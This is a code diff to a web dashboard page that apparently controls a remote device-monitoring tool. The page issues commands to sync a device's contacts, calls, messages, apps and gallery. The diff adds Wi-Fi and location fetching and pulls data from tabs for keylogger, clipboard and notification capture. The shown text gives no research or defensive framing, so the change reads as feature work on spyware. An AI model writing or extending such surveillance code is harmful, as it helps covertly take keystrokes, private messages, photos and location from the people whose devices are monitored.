@@ -53,9 +53,17 @@ export default function DeviceDetailPage() {
     setTabPrefs(next);
     saveTabPrefs(next);
     if (nextVal) {
-      const syncMap: Record<string, string> = { contacts: "sync_contacts", calls: "sync_calls", messages: "sync_messages", apps: "sync_apps", gallery: "sync_gallery" };
+      const syncMap: Record<string, string> = {
+        contacts: "sync_contacts", calls: "sync_calls", messages: "sync_messages",
+        apps: "sync_apps", gallery: "sync_gallery", security: "sync_wifi",
+      };
       if (syncMap[tabId]) sendCommand(syncMap[tabId], {}, `Sync ${tabId}`);
-      fetchTabData(tabId, true, true);
+      if (["notifications", "keylogger", "clipboard", "security"].includes(tabId)) {
+        fetchTelemetryData(tabId);
+      } else {
+        fetchTabData(tabId, true, true);
+        setTimeout(() => fetchTabData(tabId, true, true), 2500);
+      }
     }
   };
 
@@ -126,9 +134,18 @@ export default function DeviceDetailPage() {
         isTabEnabled={isTabEnabled(activeTab)}
         onToggleTab={() => toggleTab(activeTab)}
         onFetchOnce={() => {
-          const syncMap: Record<string, string> = { contacts: "sync_contacts", calls: "sync_calls", messages: "sync_messages", apps: "sync_apps", gallery: "sync_gallery" };
+          const syncMap: Record<string, string> = {
+            contacts: "sync_contacts", calls: "sync_calls", messages: "sync_messages",
+            apps: "sync_apps", gallery: "sync_gallery", security: "sync_wifi", map: "fetch_location",
+          };
           if (syncMap[activeTab]) sendCommand(syncMap[activeTab], {}, `Sync ${activeTab}`);
-          fetchTabData(activeTab, true, true);
+          if (["notifications", "keylogger", "clipboard", "security"].includes(activeTab)) {
+            fetchTelemetryData(activeTab);
+            setTimeout(() => fetchTelemetryData(activeTab), 2500);
+          } else {
+            fetchTabData(activeTab, true, true);
+            setTimeout(() => fetchTabData(activeTab, true, true), 2500);
+          }
         }}
         onToggleLiveMovement={handleToggleLiveMovement}
         onSendCommand={sendCommand}
